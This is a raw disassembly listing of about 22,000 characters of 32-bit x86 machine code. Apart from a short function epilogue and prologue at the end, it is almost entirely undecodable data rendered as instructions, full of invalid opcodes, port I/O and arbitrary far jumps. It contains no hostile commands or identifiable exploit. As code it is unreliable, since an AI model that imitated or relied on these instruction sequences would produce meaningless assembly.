  40aa39:	xor    BYTE PTR [edi-0x154fac91],0x20
  40aa40:	fst    QWORD PTR [ebx]
  40aa42:	add    DWORD PTR [eax-0x179c5bbc],ebp
  40aa48:	mov    al,0x6b
  40aa4a:	dec    eax
  40aa4b:	les    edx,FWORD PTR ds:0x5b065c4b
  40aa51:	cld    
  40aa52:	rcr    BYTE PTR [eax],cl
  40aa54:	cmp    al,0xa5
  40aa56:	dec    ecx
  40aa57:	xor    DWORD PTR [ebx+esi*4],0x78
  40aa5b:	adc    DWORD PTR ds:0x46000ad9,edi
  40aa61:	js     0x40aa2c
  40aa63:	mov    al,0x14
  40aa65:	neg    al
  40aa67:	hlt    
  40aa68:	fimul  WORD PTR [edi]
  40aa6a:	jp     0x40aaa0
  40aa6c:	xchg   ebp,eax
  40aa6d:	scas   eax,DWORD PTR es:[edi]
  40aa6e:	or     eax,0xff1fb312
  40aa73:	xlat   BYTE PTR ds:[ebx]
  40aa74:	out    0x73,al
  40aa76:	xchg   esi,eax
  40aa77:	or     BYTE PTR [ebp+0x41324a14],cl
  40aa7d:	push   esp
  40aa7e:	pop    eax
  40aa7f:	push   edi
  40aa80:	pop    ds
  40aa81:	jmp    0x52d1c67
  40aa86:	clc    
  40aa87:	cwde   
  40aa88:	adc    al,0x93
  40aa8b:	cmp    BYTE PTR [edx-0x11],ah
  40aa8e:	in     eax,dx
  40aa8f:	mov    ebx,0xd9731bd5
  40aa94:	jecxz  0x40aaa1
  40aa96:	into   
  40aa97:	dec    edi
  40aa98:	cli    
  40aa99:	pusha  
  40aa9a:	int3   
  40aa9b:	sbb    eax,0xb4560496
  40aaa0:	mov    dh,0x33
  40aaa2:	inc    ecx
  40aaa3:	les    ebp,FWORD PTR [edi]
  40aaa5:	movnti DWORD PTR [ebp+0x12],ebx
  40aaa9:	dec    edi
  40aaaa:	adc    DWORD PTR [esp+ebp*8],ecx
  40aaad:	sbb    ah,BYTE PTR [ebx+0x41910e00]
  40aab3:	pop    ecx
  40aab4:	push   ecx
  40aab5:	cld    
  40aab6:	dec    ebp
  40aab7:	or     al,0x85
  40aab9:	jb     0x40aa86
  40aabb:	and    eax,0x52358449
  40aac0:	add    dh,ch
  40aac2:	sub    BYTE PTR [edi+0x491407fa],dh
  40aac8:	iret   
  40aac9:	int3   
  40aaca:	and    dh,BYTE PTR [ebp+0x2b]
  40aacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aace:	push   ebx
  40aacf:	xor    eax,0x76e4e1a6
  40aad4:	iret   
  40aad5:	mov    eax,0x414777eb
  40aada:	mov    dl,BYTE PTR [ebp-0x244a874f]
  40aae0:	pop    ecx
  40aae1:	adc    al,0x6b
  40aae3:	std    
  40aae4:	in     al,dx
  40aae5:	clc    
  40aae6:	arpl   WORD PTR [eax-0x74],di
  40aae9:	stos   DWORD PTR es:[edi],eax
  40aaea:	adc    edi,edx
  40aaec:	stos   BYTE PTR es:[edi],al
  40aaed:	dec    esi
  40aaee:	add    DWORD PTR [edx],0xffffffb6
  40aaf1:	jecxz  0x40aab2
  40aaf3:	pushf  
  40aaf4:	ins    BYTE PTR es:[edi],dx
  40aaf5:	or     ah,0x29
  40aaf8:	(bad)  
  40aaf9:	and    DWORD PTR es:[eax+0x4],eax
  40aafd:	xchg   ebp,eax
  40aafe:	or     ebx,esi
  40ab00:	adc    bh,BYTE PTR [edx+0x50053647]
  40ab06:	ret    
  40ab07:	fild   DWORD PTR [edx]
  40ab09:	add    BYTE PTR [ebx-0x381526d2],0xef
  40ab10:	js     0x40ab28
  40ab12:	push   ebp
  40ab13:	das    
  40ab14:	mov    dl,0xf4
  40ab16:	jle    0x40ab90
  40ab18:	push   0x76cd7097
  40ab1d:	mov    bl,0xb1
  40ab1f:	dec    edx
  40ab20:	aam    0xcf
  40ab22:	pushf  
  40ab23:	scas   al,BYTE PTR es:[edi]
  40ab24:	dec    ebp
  40ab25:	push   es
  40ab26:	lods   al,BYTE PTR ds:[esi]
  40ab27:	in     eax,0xc3
  40ab29:	je     0x40ab5a
  40ab2b:	mul    DWORD PTR [edx-0x3a8fa827]
  40ab31:	jmp    0x6802:0xbd25b7b6
  40ab38:	mov    ds:0x7187b918,eax
  40ab3d:	dec    edi
  40ab3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab3f:	jecxz  0x40ab43
  40ab41:	cmp    eax,0x71936f49
  40ab46:	enter  0xbbd0,0x84
  40ab4a:	mov    al,ds:0x167ef8fd
  40ab4f:	icebp  
  40ab50:	aas    
  40ab51:	pop    es
  40ab52:	mov    al,0x47
  40ab54:	outs   dx,DWORD PTR ds:[esi]
  40ab55:	xchg   edi,eax
  40ab56:	pop    ss
  40ab57:	fs nop
  40ab59:	pop    edx
  40ab5a:	dec    edi
  40ab5b:	lahf   
  40ab5c:	cmp    BYTE PTR [ecx],ch
  40ab5e:	jecxz  0x40ab69
  40ab60:	push   ss
  40ab61:	inc    esi
  40ab62:	push   ecx
  40ab63:	xchg   ecx,eax
  40ab64:	jno    0x40ab2c
  40ab66:	mov    ch,0x3d
  40ab68:	cmp    al,0xa1
  40ab6a:	test   al,0xa
  40ab6c:	adc    al,0xf9
  40ab6e:	jae    0x40ab47
  40ab70:	stos   BYTE PTR es:[edi],al
  40ab71:	leave  
  40ab72:	imul   esi,eax,0x40bf0002
  40ab78:	div    BYTE PTR [edi+0x4784c15b]
  40ab7e:	leave  
  40ab7f:	jle    0x40ab52
  40ab81:	and    al,0x72
  40ab83:	lds    ebx,FWORD PTR [ebx-0x59]
  40ab86:	push   ss
  40ab87:	or     eax,DWORD PTR [edi+0x6ef4d954]
  40ab8d:	and    al,0xd7
  40ab8f:	int    0x4
  40ab91:	bound  ecx,QWORD PTR [edx-0x3da8713e]
  40ab97:	xor    DWORD PTR [ecx-0x2e4855b4],esp
  40ab9d:	or     BYTE PTR [ecx-0x3],ah
  40aba0:	or     ecx,DWORD PTR [edx+0x29bf363]
  40aba6:	pop    ds
  40aba7:	mov    ecx,eax
  40aba9:	mov    bl,0x9f
  40abab:	dec    ebp
  40abac:	mov    esi,0x37c40cdf
  40abb1:	push   ds
  40abb2:	ins    BYTE PTR es:[edi],dx
  40abb3:	and    edx,esp
  40abb5:	out    0x98,al
  40abb7:	ret    
  40abb8:	sbb    BYTE PTR [edi-0x79a3cf60],bl
  40abbe:	int3   
  40abbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc0:	and    eax,DWORD PTR [ecx+0x518518f7]
  40abc6:	mov    edi,0x9f4e564e
  40abcb:	repnz dec esi
  40abcd:	jbe    0x40ac46
  40abcf:	(bad)  
  40abd0:	adc    ebx,edx
  40abd2:	cmp    al,BYTE PTR [esi-0x4f]
  40abd5:	mov    eax,ds:0x1d3c291a
  40abda:	inc    eax
  40abdb:	int    0x5e
  40abdd:	pop    eax
  40abde:	iret   
  40abdf:	push   0xadb9382e
  40abe4:	mov    ebx,0x965ade83
  40abe9:	push   ecx
  40abea:	mov    bh,0x55
  40abec:	aam    0xa4
  40abee:	cmp    al,0xb8
  40abf0:	ror    BYTE PTR [ebx+0x23258802],0xbf
  40abf7:	mov    ah,0x5f
  40abf9:	sbb    dh,bl
  40abfb:	ret    0x7806
  40abfe:	mov    esi,0x82803b73
  40ac03:	ins    BYTE PTR es:[edi],dx
  40ac04:	out    dx,eax
  40ac05:	mov    ebp,0x202dc86
  40ac0a:	pop    ss
  40ac0b:	fs sub eax,0x7eefcf2d
  40ac11:	(bad)  
  40ac12:	fadd   QWORD PTR [edi]
  40ac14:	out    0x4d,al
  40ac16:	fsub   QWORD PTR [esi+0x72]
  40ac19:	inc    ebp
  40ac1a:	pop    gs
  40ac1c:	repz xor edx,ebx
  40ac1f:	fmul   QWORD PTR [ebx-0x22]
  40ac22:	retf   
  40ac23:	jmp    0x40abf5
  40ac25:	or     ecx,DWORD PTR [ecx*4-0x25374f7b]
  40ac2c:	aam    0x1d
  40ac2e:	fwait
  40ac2f:	ror    DWORD PTR [ebp-0x3c],1
  40ac32:	(bad)  
  40ac34:	pushf  
  40ac35:	int    0xd2
  40ac37:	xchg   esp,eax
  40ac38:	push   ds
  40ac39:	loope  0x40ac64
  40ac3b:	mov    bl,BYTE PTR [eax]
  40ac3d:	push   eax
  40ac3e:	dec    ch
  40ac40:	mov    al,ds:0x1f63831b
  40ac45:	add    BYTE PTR [ecx+eiz*4+0x7c],al
  40ac49:	jnp    0x40aca7
  40ac4b:	ret    0x3f1a
  40ac4e:	and    ebp,edx
  40ac50:	leave  
  40ac51:	and    DWORD PTR [edx-0x43],ebx
  40ac54:	jl     0x40ac68
  40ac56:	in     al,0x95
  40ac58:	cmc    
  40ac59:	add    BYTE PTR [edx-0x1d],dl
  40ac5c:	lock pop ebx
  40ac5e:	inc    esi
  40ac5f:	mov    edx,0x646bc175
  40ac64:	inc    ecx
  40ac65:	fbstp  TBYTE PTR [ebx+ebx*8]
  40ac68:	xor    ecx,ecx
  40ac6a:	push   ebp
  40ac6b:	mov    dl,0xc4
  40ac6d:	push   ss
  40ac6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6f:	xor    BYTE PTR [ecx],ah
  40ac71:	call   0x810ebd8e
  40ac76:	pop    ds
  40ac77:	jmp    0x7564e928
  40ac7c:	ins    BYTE PTR es:[edi],dx
  40ac7d:	inc    edi
  40ac7e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40ac80:	xor    edx,DWORD PTR [ebx+0x6d598d48]
  40ac86:	jecxz  0x40acb5
  40ac88:	retf   
  40ac89:	out    dx,al
  40ac8a:	(bad)  
  40ac8b:	loop   0x40aca1
  40ac8d:	push   es
  40ac8e:	sub    eax,DWORD PTR [ecx]
  40ac90:	fsubr  DWORD PTR [ebp+ebx*1-0x40]
  40ac94:	nop
  40ac95:	jg     0x40acb3
  40ac97:	std    
  40ac98:	ss jbe 0x40ac6e
  40ac9b:	in     eax,dx
  40ac9c:	ficomp DWORD PTR [ecx-0x76]
  40ac9f:	popf   
  40aca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aca1:	(bad)  
  40aca2:	dec    esp
  40aca3:	(bad)  
  40aca4:	sub    eax,0x3f9be1a3
  40aca9:	mov    dl,0xe5
  40acab:	out    dx,eax
  40acac:	std    
  40acad:	xor    edi,DWORD PTR [ebp-0x4e13fd5e]
  40acb3:	push   eax
  40acb4:	xchg   edx,eax
  40acb5:	cmp    ebx,esp
  40acb7:	jne    0x40ac75
  40acb9:	mov    bh,0x46
  40acbb:	(bad)  
  40acbc:	sbb    BYTE PTR [edx-0x3a],bl
  40acbf:	mov    ds:0xfb3e96e3,eax
  40acc4:	mov    ?,ecx
  40acc6:	pop    esp
  40acc7:	addr16 test al,0x1e
  40acca:	adc    DWORD PTR [esp+eax*8-0x28],edi
  40acce:	ficomp WORD PTR [ebp+0x1c85b14d]
  40acd4:	push   ds
  40acd5:	pop    ss
  40acd6:	and    edi,DWORD PTR [ebx-0x73]
  40acd9:	fidiv  DWORD PTR [eax+ebp*1+0x6f11b250]
  40ace0:	and    eax,DWORD PTR [edx-0xe]
  40ace3:	xchg   ebx,eax
  40ace4:	daa    
  40ace5:	mov    esi,0xc68949cd
  40acea:	fcom   QWORD PTR [esi+0x2dbbedc9]
  40acf0:	mov    al,ds:0xda8ae6ea
  40acf5:	jo     0x40ac8d
  40acf7:	jmp    0x40ac83
  40acf9:	in     eax,0x68
  40acfb:	jo     0x40acdd
  40acfd:	mov    al,0xe7
  40acff:	aas    
  40ad00:	lahf   
  40ad01:	stos   BYTE PTR es:[edi],al
  40ad02:	(bad)  
  40ad03:	push   eax
  40ad04:	push   ds
  40ad05:	das    
  40ad06:	or     ebx,ebp
  40ad08:	loopne 0x40ad13
  40ad0a:	sub    ebp,DWORD PTR [ebx]
  40ad0c:	add    DWORD PTR [ecx-0x3c755b6],edx
  40ad12:	aad    0xd5
  40ad14:	xchg   ebx,eax
  40ad15:	adc    ch,BYTE PTR [esi-0x55]
  40ad18:	iret   
  40ad19:	sub    al,0xfb
  40ad1b:	xchg   ebx,eax
  40ad1c:	or     cl,BYTE PTR [eax+esi*4+0x1]
  40ad20:	aam    0x5d
  40ad22:	ss pop ebp
  40ad24:	ja     0x40acd8
  40ad26:	out    dx,al
  40ad27:	in     eax,0xe0
  40ad29:	or     BYTE PTR [ecx+0x7743d202],ch
  40ad2f:	int3   
  40ad30:	mov    ds:0xda28ed2c,eax
  40ad35:	jmp    0xae25:0xdb89b8c5
  40ad3c:	xor    DWORD PTR [esi+0x52d871ea],eax
  40ad42:	fcmovnbe st,st(4)
  40ad44:	jo     0x40ace3
  40ad46:	sbb    al,0x68
  40ad48:	(bad)  
  40ad49:	sub    BYTE PTR [eax+0x25],0x35
  40ad4d:	and    DWORD PTR [ecx-0x651f65f7],ebx
  40ad53:	add    bh,BYTE PTR [edi+0x1b]
  40ad56:	js     0x40ad85
  40ad58:	add    eax,0xa5243a01
  40ad5d:	and    edi,DWORD PTR [esi+0x6a]
  40ad60:	jno    0x40ada7
  40ad62:	ja     0x40adde
  40ad64:	cmp    ch,BYTE PTR [eax+0x5f]
  40ad67:	outs   dx,BYTE PTR ds:[esi]
  40ad68:	jl     0x40ad40
  40ad6a:	test   BYTE PTR [eax-0x3f09c428],dh
  40ad70:	sub    DWORD PTR [ecx+0x3060a569],ebp
  40ad76:	and    al,0x50
  40ad78:	pop    eax
  40ad79:	or     BYTE PTR [esi-0x73],al
  40ad7c:	push   es
  40ad7d:	mov    eax,0x8fe9f82e
  40ad82:	jg     0x40ad44
  40ad84:	inc    ebp
  40ad85:	xchg   edx,eax
  40ad86:	outs   dx,BYTE PTR ds:[esi]
  40ad87:	std    
  40ad88:	xor    DWORD PTR [esp+esi*2+0x21],esp
  40ad8c:	inc    esi
  40ad8d:	les    eax,FWORD PTR [eax]
  40ad8f:	iret   
  40ad90:	jl     0x40ad47
  40ad92:	ss clc 
  40ad94:	(bad)  
  40ad95:	cmp    edx,ebp
  40ad97:	lahf   
  40ad98:	popf   
  40ad99:	mov    edi,0x98ffe645
  40ad9e:	aad    0x62
  40ada0:	test   eax,0x7d74a53e
  40ada5:	rol    BYTE PTR [ebx+0x3c471bb7],1
  40adab:	cmp    edx,ebp
  40adad:	mov    WORD PTR ds:0x75f9916c,ds
  40adb3:	or     ebp,DWORD PTR [ebp-0x64]
  40adb6:	cmp    DWORD PTR [edi+0x79],ebp
  40adb9:	jecxz  0x40adc6
  40adbb:	mov    esi,0x32989ba8
  40adc0:	mov    cl,0x8b
  40adc2:	sub    esi,DWORD PTR [edx]
  40adc4:	adc    BYTE PTR ds:0x566b5697,ah
  40adca:	dec    eax
  40adcb:	pop    ss
  40adcc:	retf   0x4055
  40adcf:	and    dh,BYTE PTR [ecx]
  40add1:	inc    eax
  40add2:	pop    es
  40add3:	mov    ds:0x2c77c7d8,eax
  40add8:	icebp  
  40add9:	xchg   BYTE PTR [ecx],ch
  40addb:	inc    eax
  40addc:	push   edx
  40addd:	stc    
  40adde:	clc    
  40addf:	push   es
  40ade0:	mov    bh,0xb1
  40ade2:	xor    cl,cl
  40ade4:	in     eax,dx
  40ade5:	jo     0x40ae63
  40ade7:	sbb    BYTE PTR [esi-0x6e225371],cl
  40aded:	fst    QWORD PTR [esi-0x31]
  40adf0:	jl     0x40adb4
  40adf2:	mov    esp,0x5451486e
  40adf7:	jg     0x40ad82
  40adf9:	dec    esp
  40adfa:	icebp  
  40adfb:	(bad)  
  40adfc:	out    dx,al
  40adfd:	sub    dh,BYTE PTR [edi+eax*4+0x26]
  40ae01:	mov    edi,0x38ae13a8
  40ae06:	xchg   BYTE PTR [eiz*8+0x5af222cd],dh
  40ae0d:	test   DWORD PTR [eax],esp
  40ae0f:	push   0xb596a6b1
  40ae14:	repz retf 
  40ae16:	and    ecx,eax
  40ae18:	push   es
  40ae19:	cmp    eax,0x4397a24c
  40ae1e:	mov    esi,DWORD PTR [edx+ecx*4+0x4c607bab]
  40ae25:	mov    cs,WORD PTR [esi+0x4d5c55b0]
  40ae2b:	stos   BYTE PTR es:[edi],al
  40ae2c:	fxch   st(3)
  40ae2e:	pop    ss
  40ae2f:	addr16 mov esp,0x2940f7cd
  40ae35:	mov    ?,WORD PTR [eax-0xbdd3293]
  40ae3b:	xor    al,0x6b
  40ae3d:	xchg   ebx,eax
  40ae3e:	and    ch,BYTE PTR [esi]
  40ae40:	iret   
  40ae41:	inc    ecx
  40ae42:	xchg   esp,eax
  40ae43:	adc    eax,0x2c65b858
  40ae48:	in     al,0xe0
  40ae4a:	(bad)  
  40ae4b:	fist   DWORD PTR [ecx+0x68]
  40ae4e:	out    0xd4,al
  40ae50:	iret   
  40ae51:	mov    esp,0x52a9156d
  40ae56:	test   eax,0x2db6fd13
  40ae5b:	dec    esp
  40ae5c:	mov    ebx,0x2c92bbf3
  40ae61:	icebp  
  40ae62:	in     al,dx
  40ae63:	repz lea eax,[edi+0x557a070f]
  40ae6a:	mov    bl,0x4f
  40ae6c:	adc    BYTE PTR [edx+0x0],cl
  40ae6f:	outs   dx,DWORD PTR ds:[esi]
  40ae70:	ja     0x40ae04
  40ae72:	mov    bh,0x6b
  40ae74:	mov    edi,0xc47e4cd
  40ae79:	dec    edi
  40ae7a:	lods   al,BYTE PTR ds:[esi]
  40ae7b:	mov    DWORD PTR [eax+edi*1-0x72],esp
  40ae7f:	call   0x33c2e335
  40ae84:	xchg   esi,eax
  40ae85:	or     esp,DWORD PTR [ecx+ebp*8+0x658bbd71]
  40ae8c:	cmp    al,0x6c
  40ae8e:	int    0xcd
  40ae90:	jbe    0x40ae75
  40ae92:	test   DWORD PTR [edx+0x32],esi
  40ae95:	xchg   esi,eax
  40ae96:	icebp  
  40ae97:	mov    al,ds:0x3d90abc2
  40ae9c:	push   eax
  40ae9d:	(bad)  
  40ae9e:	cmc    
  40ae9f:	aaa    
  40aea0:	pushw  ss
  40aea2:	jmp    0x5d38b899
  40aea7:	aad    0x23
  40aea9:	mov    WORD PTR [ebp+0x3de7c54e],?
  40aeaf:	sub    eax,0xe23c5fad
  40aeb4:	dec    ebp
  40aeb5:	(bad)  
  40aeb6:	inc    sp
  40aeb8:	shl    ebx,cl
  40aeba:	aaa    
  40aebb:	sub    DWORD PTR cs:[ecx+0x2229b53],0xfa0acdec
  40aec6:	sar    edi,1
  40aec8:	mov    ah,cl
  40aeca:	add    DWORD PTR [eax],0x6cafb64a
  40aed0:	push   cs
  40aed1:	mov    ebp,0xc79110f9
  40aed6:	test   eax,0xb768cafb
  40aedb:	pop    ss
  40aedc:	xchg   DWORD PTR [esi],edi
  40aede:	jmp    0xed4d:0x434b5cb7
  40aee5:	mov    eax,0x3914ef12
  40aeea:	pop    ebx
  40aeeb:	into   
  40aeec:	dec    eax
  40aeed:	xchg   ebx,eax
  40aeee:	pop    ecx
  40aeef:	sbb    DWORD PTR [edx+0x2cc24c85],eax
  40aef5:	jb     0x40aed2
  40aef7:	xor    eax,0xf48ef3be
  40aefc:	jno    0x40aee7
  40aefe:	sub    eax,0x48046ed8
  40af03:	jmp    0xbd27:0x4f28bf9c
  40af0a:	pop    edx
  40af0b:	add    eax,0x3daab491
  40af10:	clc    
  40af11:	xchg   esi,eax
  40af12:	sbb    ah,bh
  40af14:	jmp    0xfa5c:0xe569cfa9
  40af1b:	inc    ecx
  40af1c:	fs push ebx
  40af1e:	mov    bh,0xe0
  40af20:	push   ecx
  40af21:	int    0x87
  40af23:	(bad)  
  40af24:	pushf  
  40af25:	sbb    edx,0xea39160c
  40af2b:	jmp    0xfe95:0x965a5f32
  40af32:	test   edx,ebx
  40af34:	inc    eax
  40af35:	aas    
  40af36:	out    dx,al
  40af37:	in     eax,dx
  40af38:	out    0x53,al
  40af3a:	add    ah,BYTE PTR [edx-0x14e19580]
  40af40:	mov    ebp,0xf2389078
  40af45:	lea    ebx,[edx-0x38432d5f]
  40af4b:	cmp    ebx,DWORD PTR [edi-0x2b]
  40af4e:	ror    DWORD PTR [eax+ecx*2],1
  40af51:	in     al,dx
  40af52:	stos   DWORD PTR es:[edi],eax
  40af53:	pushf  
  40af54:	mov    edi,DWORD PTR [eax]
  40af56:	or     eax,0xd87bd086
  40af5b:	cdq    
  40af5c:	xchg   DWORD PTR [ebp-0x60],eax
  40af5f:	sbb    DWORD PTR ds:0xad0815a7,esi
  40af65:	fstp   QWORD PTR [edi]
  40af67:	mov    bl,0x69
  40af69:	push   ds
  40af6a:	and    BYTE PTR [edi+0x66bc14a7],ch
  40af70:	add    BYTE PTR [ecx],bh
  40af72:	jns    0x40afd2
  40af74:	out    dx,eax
  40af75:	inc    esi
  40af76:	or     BYTE PTR [ebx],0xb4
  40af79:	pop    es
  40af7a:	jmp    0x40afa5
  40af7c:	(bad)  
  40af7d:	out    0x37,eax
  40af7f:	inc    ecx
  40af80:	jne    0x40af4b
  40af82:	inc    ebp
  40af83:	sub    edi,DWORD PTR [ecx+0x6d]
  40af86:	retf   
  40af87:	stc    
  40af88:	icebp  
  40af89:	fnstsw WORD PTR [edx+0x5ebf5bcd]
  40af8f:	inc    edi
  40af90:	or     ecx,DWORD PTR [ecx+ebx*4-0x84c15d]
  40af97:	jmp    0x40af4f
  40af99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af9a:	nop
  40af9b:	aaa    
  40af9c:	ins    BYTE PTR es:[edi],dx
  40af9d:	(bad)  
  40af9e:	call   FWORD PTR [ebx+0x416b53a]
  40afa4:	shr    DWORD PTR [eax+0x44],0x23
  40afa8:	popf   
  40afa9:	pop    es
  40afaa:	push   ebp
  40afab:	repz popf 
  40afad:	popf   
  40afae:	cmp    BYTE PTR [eax],bh
  40afb0:	pop    ds
  40afb1:	inc    edx
  40afb2:	fidivr DWORD PTR [ecx+0x1329de1f]
  40afb8:	add    al,0xf2
  40afba:	icebp  
  40afbb:	out    0xd5,eax
  40afbd:	in     al,0x7d
  40afbf:	ins    BYTE PTR es:[edi],dx
  40afc0:	neg    DWORD PTR [ecx]
  40afc2:	mov    al,0x5a
  40afc4:	out    0x2e,al
  40afc6:	das    
  40afc7:	pop    esi
  40afc8:	mov    ch,0xad
  40afca:	dec    edi
  40afcb:	das    
  40afcc:	sbb    bh,BYTE PTR [ebx-0x5c40ecbb]
  40afd2:	jecxz  0x40afb6
  40afd4:	shl    DWORD PTR ds:0x37a361a9,cl
  40afda:	dec    ebp
  40afdb:	add    al,0x71
  40afdd:	push   ebp
  40afde:	fiadd  WORD PTR [ecx+0x7a516019]
  40afe4:	xchg   edx,eax
  40afe5:	das    
  40afe6:	xchg   BYTE PTR ds:0x1c73b328,dh
  40afec:	mov    es,WORD PTR [esi]
  40afee:	push   0xca1cdff2
  40aff3:	je     0x40af97
  40aff5:	add    eax,DWORD PTR [ebx+0x753a5367]
  40affb:	dec    DWORD PTR [edx+0x6b7ba910]
  40b001:	mov    esi,0xf77cd9a8
  40b006:	jecxz  0x40afc2
  40b008:	inc    ebx
  40b009:	cmp    ebx,esi
  40b00b:	retf   0x22e9
  40b00e:	adc    eax,0x99cf9ab8
  40b013:	ds push ecx
  40b015:	(bad)  
  40b016:	dec    ebx
  40b017:	sbb    BYTE PTR ds:0x938c3b10,bl
  40b01d:	stos   BYTE PTR es:[edi],al
  40b01e:	fldcw  WORD PTR [ecx]
  40b020:	test   al,ch
  40b022:	sub    edi,DWORD PTR [ecx]
  40b024:	xchg   ecx,eax
  40b025:	and    DWORD PTR [esi-0x3b],esp
  40b028:	push   ebx
  40b029:	push   edx
  40b02a:	rcr    DWORD PTR [edx+0x61],1
  40b02d:	add    eax,0xe851f2ea
  40b032:	pop    ebx
  40b033:	or     al,0xfe
  40b035:	scas   eax,DWORD PTR es:[edi]
  40b036:	xor    eax,0xc701ca0b
  40b03b:	pop    ss
  40b03c:	daa    
  40b03d:	cld    
  40b03e:	mov    ch,0xe7
  40b040:	and    eax,DWORD PTR [esi+0x1c36b901]
  40b046:	or     DWORD PTR [ecx],edi
  40b048:	into   
  40b049:	pop    edx
  40b04a:	stc    
  40b04b:	jl     0x40b024
  40b04d:	dec    ecx
  40b04e:	test   eax,0x42f5b4c0
  40b053:	pop    ds
  40b054:	out    dx,al
  40b055:	sub    dl,BYTE PTR ds:0x8d070c3e
  40b05b:	iret   
  40b05c:	xchg   ebx,eax
  40b05d:	leave  
  40b05e:	ja     0x40b080
  40b060:	pop    ds
  40b061:	cmp    cl,BYTE PTR [edi+edx*1+0x14]
  40b065:	adc    DWORD PTR [edx+0x1c],0x89b38842
  40b06c:	jo     0x40b09c
  40b06e:	inc    ecx
  40b06f:	sbb    ch,bh
  40b071:	pop    esi
  40b072:	dec    eax
  40b073:	mov    dl,0xfa
  40b075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b076:	mov    eax,0x3afb407f
  40b07b:	enter  0x345,0x78
  40b07f:	cmp    al,0xc9
  40b081:	lea    ecx,[eax+0x7c]
  40b084:	and    al,0xe6
  40b086:	jne    0x40b068
  40b088:	inc    edi
  40b089:	inc    ecx
  40b08a:	mov    dh,0x8e
  40b08c:	fwait
  40b08d:	in     eax,0x99
  40b08f:	sar    DWORD PTR [ebx+0xa986164],cl
  40b095:	and    DWORD PTR [edi+ebp*2-0x5683a8c9],eax
  40b09c:	push   esi
  40b09d:	xlat   BYTE PTR ds:[ebx]
  40b09e:	loope  0x40b0b0
  40b0a0:	loope  0x40b10f
  40b0a2:	ds cmp eax,0x7f77c8ad
  40b0a8:	iret   
  40b0a9:	or     BYTE PTR [edx-0x43],ch
  40b0ac:	adc    al,0x95
  40b0ae:	ds ret 0xcf65
  40b0b2:	dec    esp
  40b0b3:	lahf   
  40b0b4:	test   BYTE PTR [ecx],dh
  40b0b6:	nop
  40b0b7:	in     al,0x1f
  40b0b9:	pop    edx
  40b0ba:	jecxz  0x40b09a
  40b0bc:	adc    bh,BYTE PTR [ebp+0x14591ec]
  40b0c2:	rcl    BYTE PTR [edi+0x4dd5e54c],0xdf
  40b0c9:	loope  0x40b13d
  40b0cb:	fstp   TBYTE PTR [eax]
  40b0cd:	push   ecx
  40b0ce:	(bad)  
  40b0cf:	ds retf 0x651e
  40b0d3:	scas   al,BYTE PTR es:[edi]
  40b0d4:	out    dx,al
  40b0d5:	daa    
  40b0d6:	or     ecx,DWORD PTR cs:[ebp+eax*8-0x3f0a0729]
  40b0de:	mov    bh,0xd7
  40b0e0:	xchg   edi,eax
  40b0e2:	jge    0x40b12b
  40b0e4:	or     BYTE PTR es:[esi-0x3d],0xb6
  40b0e9:	popf   
  40b0ea:	sti    
  40b0eb:	loope  0x40b09c
  40b0ed:	push   ecx
  40b0ee:	cmc    
  40b0ef:	jmp    0x4e469276
  40b0f4:	sahf   
  40b0f5:	loopne 0x40b165
  40b0f7:	push   ebx
  40b0f8:	sub    edx,edx
  40b0fa:	test   eax,0xb9efe4f6
  40b0ff:	shl    BYTE PTR [eax+0x53c68810],0x4f
  40b106:	out    dx,eax
  40b107:	(bad)  
  40b108:	xchg   ebx,eax
  40b109:	popa   
  40b10a:	iret   
  40b10b:	fnstcw WORD PTR [eax+0x2072a81e]
  40b111:	sbb    eax,0x8cd6e2fd
  40b116:	aad    0x1e
  40b118:	sbb    eax,0x1b3eed99
  40b11d:	ins    BYTE PTR es:[edi],dx
  40b11e:	or     esp,DWORD PTR [esi+0x9]
  40b121:	scas   eax,DWORD PTR es:[edi]
  40b122:	jo     0x40b0d7
  40b124:	mov    ah,0x77
  40b126:	xchg   ebx,eax
  40b127:	sar    BYTE PTR [ebp+0x7d],0x5b
  40b12b:	pop    ebp
  40b12c:	and    DWORD PTR [edi-0x26],edi
  40b12f:	pop    ebx
  40b130:	nop
  40b131:	int    0xc0
  40b133:	push   0x44
  40b135:	xchg   edi,eax
  40b136:	mov    eax,0x1cbe120a
  40b13b:	mov    DWORD PTR [eax],ecx
  40b13d:	pop    esi
  40b13e:	inc    edx
  40b13f:	add    al,0xed
  40b141:	imul   ebx,DWORD PTR [eax],0xf
  40b144:	(bad)  
  40b145:	fmul   DWORD PTR [edx+0x6ccdcda6]
  40b14b:	xor    DWORD PTR [edx],0x21
  40b14e:	ret    0xbcb6
  40b151:	jnp    0x40b187
  40b153:	(bad)  
  40b154:	in     al,0x16
  40b156:	jge    0x40b11b
  40b158:	mov    ds,WORD PTR [edi+0x44]
  40b15b:	pushf  
  40b15c:	call   0xf83b10fe
  40b161:	lea    ecx,[edi+0x4735d10a]
  40b167:	mov    ecx,0x38271813
  40b16c:	pop    eax
  40b16d:	addr16 leave 
  40b16f:	test   eax,0xc66dff79
  40b174:	(bad)  
  40b176:	and    bl,dh
  40b178:	leave  
  40b179:	imul   ah
  40b17b:	out    0xec,eax
  40b17d:	fimul  DWORD PTR [esi+0x68]
  40b180:	push   esi
  40b181:	(bad)  
  40b182:	lds    ebx,FWORD PTR fs:[edi-0x70d9a92]
  40b189:	(bad)
  40b18d:	das    
  40b18e:	or     ecx,esi
  40b190:	pop    ebx
  40b191:	push   ds
  40b192:	mov    ah,0x11
  40b194:	iret   
  40b195:	and    esi,DWORD PTR [ebx-0x75]
  40b198:	inc    ebp
  40b199:	sbb    BYTE PTR [ebx+0x46891075],cl
  40b19f:	or     al,0x8b
  40b1a1:	inc    ebp
  40b1a2:	sbb    al,0x8b
  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3ec
